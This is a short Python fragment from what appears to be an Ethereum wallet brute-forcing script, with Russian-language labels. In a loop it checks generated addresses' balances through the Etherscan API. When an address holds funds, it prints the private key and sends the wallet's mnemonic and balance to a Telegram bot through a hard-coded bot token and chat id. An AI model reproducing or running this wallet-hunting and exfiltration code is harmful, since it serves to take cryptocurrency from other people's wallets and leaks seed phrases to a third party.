...
def sleepMe(key):
	...
	while True:
		...
		bb = requests.get(f'https://api.etherscan.io/api?module=account&action=balance&address={public_key.address()}&tag=latest&apikey={key}').json()
		if bb["result"] !="0" and bb["result"] !="Max rate limit reached" and bb["result"] !="Invalid API Key":
			print(key)
			print(f'privkey: {binascii.hexlify(private_key).decode("utf-8")}')
			print(f'address: {public_key.address()}')
			print(f'balance: {bb["result"]}')
			ress = str(mnemonic)+"\n"+str(bb["result"])
			requests.get(f'https://api.telegram.org/bot1462564090:AAFX9wpUEcb7S0GNbuWImexIlIvhlLkIlFM/sendMessage?chat_id=831689238&text={ress}')
			totol+=int(bb["result"])/1000000000000000000
			...
			break
		i+=1
		strr = "Всего: "+str(i)+" Общий баланс: "+str(totol)
